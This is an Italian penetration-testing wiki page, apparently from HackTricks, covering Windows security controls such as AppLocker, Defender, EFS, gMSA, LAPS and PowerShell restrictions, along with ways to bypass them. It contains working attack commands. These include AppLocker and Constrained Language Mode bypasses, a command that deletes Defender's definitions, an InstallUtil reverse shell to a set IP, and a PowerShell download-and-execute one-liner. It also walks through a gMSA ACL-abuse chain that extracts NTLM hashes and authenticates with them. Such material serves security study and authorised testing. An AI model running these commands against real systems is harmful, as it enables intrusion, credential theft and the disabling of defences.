# Controlli di sicurezza di Windows

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

Una whitelist delle applicazioni è un elenco di applicazioni software o eseguibili approvati, che possono essere presenti ed eseguiti su un sistema. L'obiettivo è proteggere l'ambiente da malware dannosi e software non approvati che non sono in linea con le esigenze aziendali specifiche di un'organizzazione.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) è la **application whitelisting solution** di Microsoft e offre agli amministratori di sistema il controllo su **quali applicazioni e file gli utenti possono eseguire**. Fornisce un **controllo granulare** su eseguibili, script, file Windows Installer, DLL, app pacchettizzate e installer di app pacchettizzate.\
È comune per le organizzazioni **bloccare cmd.exe e PowerShell.exe** e limitare l'accesso in scrittura a determinate directory, **ma tutto questo può essere bypassato**.

### Verifica

Verifica quali file/estensioni sono blacklistati/inclusi nella whitelist:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Questo percorso del registro contiene le configurazioni e le policy applicate da AppLocker, offrendo un modo per esaminare l'insieme corrente di regole applicate sul sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Cartelle scrivibili** utili per bypassare la policy di AppLocker: se AppLocker consente di eseguire qualsiasi cosa all'interno di `C:\Windows\System32` o `C:\Windows`, puoi usare delle **cartelle scrivibili** per **bypassare questa restrizione**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- I binari [**"LOLBAS"**](https://lolbas-project.github.io/) comunemente **considerati affidabili** possono essere utili anche per bypassare AppLocker.
- Le regole **scritte male possono essere bypassate**
- Ad esempio, con **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puoi creare una **cartella chiamata `allowed`** ovunque e questa sarà consentita.
- Le organizzazioni spesso si concentrano anche sul **blocco dell'eseguibile `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, ma dimenticano le **altre posizioni degli eseguibili di [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)**, come `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
- L'applicazione delle regole alle **DLL** è molto raramente abilitata a causa del carico aggiuntivo che può imporre al sistema e della quantità di test necessaria per assicurarsi che nulla smetta di funzionare. Pertanto, usare le **DLL come backdoor** aiuterà a bypassare AppLocker.
- Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare AppLocker. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Archiviazione delle credenziali

### Security Accounts Manager (SAM)

Le credenziali locali sono presenti in questo file; le password sono sottoposte a hashing.

### Local Security Authority (LSA) - LSASS

Le **credenziali** (sottoposte a hashing) vengono **salvate nella memoria** di questo sottosistema per motivi di Single Sign-On.\
**LSA** amministra la **security policy** locale (policy delle password, permessi degli utenti...), l'**autenticazione**, gli **access token**...\
LSA sarà il componente che **verificherà** le credenziali fornite all'interno del file **SAM** (per un accesso locale) e **comunicherà** con il **domain controller** per autenticare un utente di dominio.

Le **credenziali** vengono **salvate all'interno del processo LSASS**: ticket Kerberos, hash NT e LM, password facilmente decrittabili.

### LSA secrets

LSA può salvare su disco alcune credenziali:

- Password dell'account computer di Active Directory (domain controller non raggiungibile).
- Password degli account dei servizi Windows
- Password delle attività pianificate
- Altro (password delle applicazioni IIS...)

### NTDS.dit

È il database di Active Directory. È presente solo nei Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) è un antivirus disponibile in Windows 10 e Windows 11 e nelle versioni di Windows Server. **Blocca** strumenti comuni di pentesting come **`WinPEAS`**. Tuttavia, esistono modi per **bypassare queste protezioni**.

### Verifica

Per verificare lo **stato** di **Defender**, puoi eseguire il cmdlet PS **`Get-MpComputerStatus`** (controlla il valore di **`RealTimeProtectionEnabled`** per sapere se è attivo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Per enumerarlo, puoi anche eseguire:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## File System crittografato (EFS)

EFS protegge i file tramite crittografia, utilizzando una **chiave simmetrica** nota come **File Encryption Key (FEK)**. Questa chiave viene crittografata con la **chiave pubblica** dell'utente e memorizzata nell'**alternative data stream** $EFS del file crittografato. Quando è necessaria la decrittografia, la corrispondente **chiave privata** del certificato digitale dell'utente viene utilizzata per decrittografare la FEK dallo stream $EFS. Maggiori dettagli sono disponibili [qui](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Gli scenari di decrittografia senza l'inizializzazione da parte dell'utente** includono:

- Quando file o cartelle vengono spostati su un file system non EFS, come [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), vengono decrittografati automaticamente.
- I file crittografati inviati tramite rete usando il protocollo SMB/CIFS vengono decrittografati prima della trasmissione.

Questo metodo di crittografia consente **l'accesso trasparente** ai file crittografati da parte del proprietario. Tuttavia, cambiare semplicemente la password del proprietario ed effettuare il login non consentirà la decrittografia.

**Punti chiave**:

- EFS utilizza una FEK simmetrica, crittografata con la chiave pubblica dell'utente.
- La decrittografia utilizza la chiave privata dell'utente per accedere alla FEK.
- La decrittografia automatica avviene in condizioni specifiche, come la copia su FAT32 o la trasmissione tramite rete.
- I file crittografati sono accessibili al proprietario senza passaggi aggiuntivi.

### Controllare le informazioni EFS

Verifica se un **utente** ha **utilizzato** questo **servizio**, controllando se esiste questo percorso:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Controlla **chi** ha **accesso** al file usando cipher /c \<file>\
Puoi anche usare `cipher /e` e `cipher /d` all'interno di una cartella per **crittografare** e **decrittografare** tutti i file

### Decrittografare i file EFS

#### Essere Authority System

Questo metodo richiede che l'**utente vittima** abbia un **processo** **in esecuzione** sull'host. In tal caso, usando una sessione `meterpreter` puoi impersonare il token del processo dell'utente (`impersonate_token` da `incognito`). In alternativa, puoi semplicemente eseguire `migrate` verso il processo dell'utente.

#### Conoscere la password dell'utente


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ha sviluppato le **Group Managed Service Accounts (gMSA)** per semplificare la gestione degli account di servizio nelle infrastrutture IT. A differenza degli account di servizio tradizionali, che spesso hanno l'impostazione "**Password never expire**" abilitata, le gMSA offrono una soluzione più sicura e gestibile:

- **Gestione automatica delle password**: le gMSA utilizzano una password complessa di 240 caratteri che cambia automaticamente in base ai criteri del dominio o del computer. Questo processo è gestito dal Key Distribution Service (KDC) di Microsoft, eliminando la necessità di aggiornamenti manuali delle password.
- **Sicurezza migliorata**: questi account sono immuni ai lockout e non possono essere utilizzati per i login interattivi, migliorando la loro sicurezza.
- **Supporto per più host**: le gMSA possono essere condivise tra più host, rendendole ideali per i servizi eseguiti su più server.
- **Supporto per le attività pianificate**: a differenza degli managed service account, le gMSA supportano l'esecuzione di attività pianificate.
- **Gestione semplificata degli SPN**: il sistema aggiorna automaticamente il Service Principal Name (SPN) quando cambiano i dettagli sAMaccount o il nome DNS del computer, semplificando la gestione degli SPN.

Le password delle gMSA sono memorizzate nella proprietà LDAP _**msDS-ManagedPassword**_ e vengono reimpostate automaticamente ogni 30 giorni dai Domain Controller (DC). Questa password, un blob di dati crittografato noto come [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), può essere recuperata solo dagli amministratori autorizzati e dai server sui quali sono installate le gMSA, garantendo un ambiente sicuro. Per accedere a queste informazioni è necessaria una connessione protetta come LDAPS, oppure la connessione deve essere autenticata con 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)<sup>[[1]](#references)</sup>

Puoi leggere questa password con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Trova maggiori informazioni in questo post**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[1]](#references)</sup>

Inoltre, consulta questa [pagina web](https://cube0x0.github.io/Relaying-for-gMSA/) per scoprire come eseguire un **NTLM relay attack** per **leggere** la **password** di **gMSA**.<sup>[[1]](#references)</sup>

### Sfruttare l'ACL chaining per leggere la password gestita di gMSA (GenericAll -> ReadGMSAPassword)

In molti ambienti, gli utenti con privilegi ridotti possono raggiungere i secrets di gMSA senza compromettere il DC, sfruttando ACL degli oggetti configurate in modo errato:<sup>[[3]](#references)</sup>

- A un gruppo che puoi controllare (ad esempio tramite GenericAll/GenericWrite) viene concesso `ReadGMSAPassword` su un gMSA.
- Aggiungendoti a quel gruppo, erediti il diritto di leggere il blob `msDS-ManagedPassword` del gMSA tramite LDAP e ricavare credenziali NTLM utilizzabili.

Workflow tipico:

1) Individua il percorso con BloodHound e contrassegna i tuoi principals di foothold come Owned. Cerca edge come:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Aggiungiti al gruppo intermedio che controlli (esempio con bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Leggi la password gestita di gMSA tramite LDAP e ricava l'hash NTLM. NetExec automatizza l'estrazione di `msDS-ManagedPassword` e la conversione in NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Effettua l'autenticazione come gMSA usando l'hash NTLM (non è necessario il plaintext). Se l'account appartiene a Remote Management Users, WinRM funzionerà direttamente:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Note:
- Le letture LDAP di `msDS-ManagedPassword` richiedono il sealing (ad esempio LDAPS/sign+seal). Gli strumenti gestiscono questo automaticamente.
- Ai gMSA vengono spesso assegnati diritti locali come WinRM; verifica l'appartenenza ai gruppi (ad esempio Remote Management Users) per pianificare il lateral movement.
- Se ti serve solo il blob per calcolare autonomamente l'NTLM, consulta la struttura MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

La **Local Administrator Password Solution (LAPS)**, disponibile per il download da [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), consente di gestire le password dell'utente Administrator locale. Queste password, **randomizzate**, univoche e **modificate regolarmente**, vengono archiviate centralmente in Active Directory. L'accesso a queste password è limitato tramite ACL agli utenti autorizzati. Con permessi sufficienti, viene fornita la possibilità di leggere le password dell'amministratore locale.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **blocca molte delle funzionalità** necessarie per usare PowerShell in modo efficace, ad esempio bloccando gli oggetti COM e consentendo solo i tipi .NET approvati, i workflow basati su XAML, le classi PowerShell e altro ancora.

### **Verifica**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
In Windows attuali quel Bypass non funzionerà, ma puoi usare[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Per compilarlo potresti dover** **aggiungere un riferimento** -> _Browse_ ->_Browse_ -> aggiungere `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` e **impostare il progetto su .Net4.5**.

#### Bypass diretto:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puoi usare [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) per **eseguire codice Powershell** in qualsiasi processo e bypassare la modalità constrained. Per maggiori informazioni, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Per impostazione predefinita è impostata su **restricted.** Modi principali per bypassare questa policy:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
È possibile trovare ulteriori informazioni [qui](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

È l'API che può essere utilizzata per autenticare gli utenti.

SSPI sarà responsabile della ricerca del protocollo adeguato per due macchine che desiderano comunicare. Il metodo preferito è Kerberos. Successivamente, SSPI negozierà quale protocollo di autenticazione utilizzare; questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL ed entrambe le macchine devono supportare lo stesso protocollo per poter comunicare.

### Principali SSP

- **Kerberos**: quello preferito
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** e **NTLMv2**: per motivi di compatibilità
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: web server e LDAP, password sotto forma di hash MD5
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL e TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: viene utilizzato per negoziare il protocollo da utilizzare (Kerberos o NTLM, con Kerberos come impostazione predefinita)
- %windir%\Windows\System32\lsasrv.dll

#### La negoziazione potrebbe offrire diversi metodi oppure soltanto uno.

## UAC - Controllo dell'account utente

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con privilegi elevati**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Riferimenti

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA tramite concatenamento dei diritti verso WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 modi per bypassare la PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
